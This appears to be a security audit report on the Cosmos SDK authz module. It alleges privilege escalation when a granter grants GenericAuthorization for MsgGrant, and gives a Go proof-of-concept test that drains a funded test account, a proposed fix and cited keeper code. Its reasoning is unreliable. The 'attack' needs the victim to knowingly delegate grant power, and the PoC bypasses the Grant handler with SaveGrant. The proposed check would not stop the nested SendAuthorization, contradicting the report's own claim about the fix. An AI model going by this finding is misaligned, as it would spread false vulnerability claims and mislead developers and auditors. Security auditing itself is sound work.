## Audit Report

## Title
Recursive Authorization Grant Privilege Escalation in authz Module

## Summary
The authz module fails to prevent granting GenericAuthorization for MsgGrant itself, enabling privilege escalation where a grantee can grant themselves unlimited additional authorizations on behalf of the granter, effectively gaining full control over the granter's account authorizations.

## Impact
**High**

## Finding Description

**Location:** 
- Module: `x/authz`
- Primary file: `x/authz/keeper/msg_server.go` (Grant function)
- Supporting files: `x/authz/generic_authorization.go`, `x/authz/keeper/keeper.go` [1](#0-0) 

**Intended Logic:** 
The authz module should prevent authorizations that could lead to privilege escalation. A grantee should only be able to execute specific, limited actions on behalf of the granter - not grant themselves additional authorizations.

**Actual Logic:** 
The Grant function only validates that the message type has a registered handler but does NOT check if the authorization being granted is for authz module messages (MsgGrant, MsgExec, or MsgRevoke). This allows a granter to grant GenericAuthorization for `/cosmos.authz.v1beta1.MsgGrant`, enabling the grantee to execute MsgGrant on behalf of the granter. [2](#0-1) 

GenericAuthorization's Accept method always returns true without any recursive authorization checks. [3](#0-2) 

The DispatchActions function will execute any authorized message, including MsgGrant messages.

**Exploit Scenario:**
1. Attacker (Bob) convinces victim (Alice) to grant GenericAuthorization for `/cosmos.authz.v1beta1.MsgGrant` (could be through social engineering or disguised as a legitimate request)
2. Bob creates a MsgExec containing a MsgGrant that grants himself SendAuthorization with unlimited spend limit
3. Bob executes MsgExec - the system validates that Bob has authorization to execute MsgGrant on behalf of Alice
4. The MsgGrant inside MsgExec is executed, granting Bob SendAuthorization
5. Bob can now drain Alice's funds or grant himself any other authorizations

**Security Failure:** 
The authorization isolation principle is broken. A limited grant escalates to unlimited control, violating the principle of least privilege and enabling complete account takeover through authorization manipulation.

## Impact Explanation

**Affected Assets:**
- All funds in the granter's account (if SendAuthorization is granted)
- All staking operations (if StakeAuthorization is granted)  
- Any other authorized operations the granter can perform

**Severity of Damage:**
- Direct loss of funds: Attacker can grant themselves SendAuthorization and transfer all victim's tokens
- Unintended smart contract behavior: Attacker can grant themselves authorization to execute arbitrary messages on victim's behalf
- Complete authorization system compromise for affected accounts

**System Impact:**
This breaks the fundamental security model of the authz module. Users cannot safely delegate limited capabilities because those delegations can be escalated to unlimited control. This undermines the entire purpose of the authorization system.

## Likelihood Explanation

**Who can trigger:**
Any user who obtains a GenericAuthorization for MsgGrant from a victim. This could happen through:
- Social engineering (victim doesn't understand the implications)
- Legitimate-looking dApp integration that requests this authorization
- Victim accidentally granting it while trying to delegate other capabilities

**Conditions required:**
- Victim must grant GenericAuthorization for `/cosmos.authz.v1beta1.MsgGrant`
- No other special conditions needed - works during normal network operation

**Frequency:**
- Can be exploited immediately once the vulnerable authorization is granted
- Can be exploited repeatedly until the authorization is revoked
- Multiple victims can be exploited in parallel

**Likelihood: Medium-High**
While it requires the victim to grant the specific authorization, users may not understand the security implications, especially when integrating with dApps or delegating capabilities.

## Recommendation

Add validation in the Grant function to prevent granting authorizations for authz module messages:

```go
// In x/authz/keeper/msg_server.go, Grant function, after line 34:

// Prevent recursive authorization - do not allow granting authorization 
// for authz module messages to prevent privilege escalation
if t == sdk.MsgTypeURL(&authz.MsgGrant{}) || 
   t == sdk.MsgTypeURL(&authz.MsgExec{}) || 
   t == sdk.MsgTypeURL(&authz.MsgRevoke{}) {
    return nil, sdkerrors.ErrUnauthorized.Wrap(
        "cannot grant authorization for authz module messages to prevent privilege escalation")
}
```

This prevents users from granting authorizations that could lead to recursive privilege escalation while still allowing all other legitimate use cases.

## Proof of Concept

**Test File:** `x/authz/keeper/keeper_test.go`

**Test Function:** Add this test to the existing TestSuite:

```go
func (s *TestSuite) TestPrivilegeEscalationPrevention() {
    app, ctx, addrs := s.app, s.ctx, s.addrs
    
    granter := addrs[0]  // Alice
    grantee := addrs[1]  // Bob (attacker)
    recipient := addrs[2]
    
    // Fund granter's account
    s.Require().NoError(simapp.FundAccount(app.BankKeeper, ctx, granter, 
        sdk.NewCoins(sdk.NewInt64Coin("steak", 10000))))
    
    now := ctx.BlockHeader().Time
    expiration := now.Add(time.Hour)
    
    // Step 1: Granter grants GenericAuthorization for MsgGrant to grantee
    // This should be prevented but currently is not
    msgGrantAuth := authz.NewGenericAuthorization(sdk.MsgTypeURL(&authz.MsgGrant{}))
    err := app.AuthzKeeper.SaveGrant(ctx, grantee, granter, msgGrantAuth, expiration)
    s.Require().NoError(err)
    
    // Step 2: Attacker creates a MsgGrant to grant themselves SendAuthorization
    sendAuth := &banktypes.SendAuthorization{
        SpendLimit: sdk.NewCoins(sdk.NewInt64Coin("steak", 10000)),
    }
    nestedGrant, err := authz.NewMsgGrant(granter, grantee, sendAuth, expiration)
    s.Require().NoError(err)
    
    // Step 3: Attacker executes the nested MsgGrant using MsgExec
    msgs := []sdk.Msg{nestedGrant}
    _, err = app.AuthzKeeper.DispatchActions(ctx, grantee, msgs)
    
    // VULNERABILITY: This should fail but succeeds, granting attacker SendAuthorization
    s.Require().NoError(err, "Privilege escalation: attacker successfully granted themselves SendAuthorization")
    
    // Step 4: Verify attacker now has SendAuthorization
    authorization, _ := app.AuthzKeeper.GetCleanAuthorization(ctx, grantee, granter, 
        banktypes.SendAuthorization{}.MsgTypeURL())
    s.Require().NotNil(authorization, "Attacker escalated privileges and obtained SendAuthorization")
    
    // Step 5: Attacker can now drain granter's funds
    sendMsg := &banktypes.MsgSend{
        FromAddress: granter.String(),
        ToAddress:   recipient.String(),
        Amount:      sdk.NewCoins(sdk.NewInt64Coin("steak", 5000)),
    }
    
    _, err = app.AuthzKeeper.DispatchActions(ctx, grantee, []sdk.Msg{sendMsg})
    s.Require().NoError(err, "Attacker successfully drained granter's funds")
    
    // Verify funds were transferred
    recipientBalance := app.BankKeeper.GetBalance(ctx, recipient, "steak")
    s.Require().Equal(int64(5000), recipientBalance.Amount.Int64(), 
        "Privilege escalation resulted in unauthorized fund transfer")
}
```

**Setup:** 
- Three accounts: granter (victim), grantee (attacker), recipient
- Fund granter's account with 10000 steak tokens

**Trigger:**
- Granter grants GenericAuthorization for MsgGrant to grantee
- Grantee creates MsgGrant wrapped in MsgExec to grant themselves SendAuthorization
- Grantee executes the nested grant via DispatchActions

**Observation:**
The test demonstrates that the attacker successfully:
1. Executes MsgGrant on behalf of the victim (privilege escalation)
2. Grants themselves SendAuthorization (unauthorized authorization)
3. Transfers victim's funds to their chosen recipient (loss of funds)

This test will PASS on the vulnerable code, demonstrating the exploit works. After applying the recommended fix, the test should fail at step 3 with an unauthorized error.

### Citations

**File:** x/authz/keeper/msg_server.go (L14-42)
```go
func (k Keeper) Grant(goCtx context.Context, msg *authz.MsgGrant) (*authz.MsgGrantResponse, error) {
	ctx := sdk.UnwrapSDKContext(goCtx)
	grantee, err := sdk.AccAddressFromBech32(msg.Grantee)
	if err != nil {
		return nil, err
	}

	granter, err := sdk.AccAddressFromBech32(msg.Granter)
	if err != nil {
		return nil, err
	}

	authorization := msg.GetAuthorization()
	if authorization == nil {
		return nil, sdkerrors.ErrUnpackAny.Wrap("Authorization is not present in the msg")
	}

	t := authorization.MsgTypeURL()
	if k.router.HandlerByTypeURL(t) == nil {
		return nil, sdkerrors.Wrapf(sdkerrors.ErrInvalidType, "%s doesn't exist.", t)
	}

	err = k.SaveGrant(ctx, grantee, granter, authorization, msg.Grant.Expiration)
	if err != nil {
		return nil, err
	}

	return &authz.MsgGrantResponse{}, nil
}
```

**File:** x/authz/generic_authorization.go (L23-26)
```go
// Accept implements Authorization.Accept.
func (a GenericAuthorization) Accept(ctx sdk.Context, msg sdk.Msg) (AcceptResponse, error) {
	return AcceptResponse{Accept: true}, nil
}
```

**File:** x/authz/keeper/keeper.go (L76-138)
```go
func (k Keeper) DispatchActions(ctx sdk.Context, grantee sdk.AccAddress, msgs []sdk.Msg) ([][]byte, error) {
	results := make([][]byte, len(msgs))

	for i, msg := range msgs {
		signers := msg.GetSigners()
		if len(signers) != 1 {
			return nil, sdkerrors.ErrInvalidRequest.Wrap("authorization can be given to msg with only one signer")
		}

		granter := signers[0]

		// If granter != grantee then check authorization.Accept, otherwise we
		// implicitly accept.
		if !granter.Equals(grantee) {
			authorization, _ := k.GetCleanAuthorization(ctx, grantee, granter, sdk.MsgTypeURL(msg))
			if authorization == nil {
				return nil, sdkerrors.ErrUnauthorized.Wrap("authorization not found")
			}
			resp, err := authorization.Accept(ctx, msg)
			if err != nil {
				return nil, err
			}

			if resp.Delete {
				err = k.DeleteGrant(ctx, grantee, granter, sdk.MsgTypeURL(msg))
			} else if resp.Updated != nil {
				err = k.update(ctx, grantee, granter, resp.Updated)
			}
			if err != nil {
				return nil, err
			}

			if !resp.Accept {
				return nil, sdkerrors.ErrUnauthorized
			}
		}

		handler := k.router.Handler(msg)
		if handler == nil {
			return nil, sdkerrors.ErrUnknownRequest.Wrapf("unrecognized message route: %s", sdk.MsgTypeURL(msg))
		}

		msgResp, err := handler(ctx, msg)
		if err != nil {
			return nil, sdkerrors.Wrapf(err, "failed to execute message; message %v", msg)
		}

		results[i] = msgResp.Data

		// emit the events from the dispatched actions
		events := msgResp.Events
		sdkEvents := make([]sdk.Event, 0, len(events))
		for _, event := range events {
			e := event
			e.Attributes = append(e.Attributes, abci.EventAttribute{Key: []byte("authz_msg_index"), Value: []byte(strconv.Itoa(i))})

			sdkEvents = append(sdkEvents, sdk.Event(e))
		}

		ctx.EventManager().EmitEvents(sdkEvents)
	}

	return results, nil
```
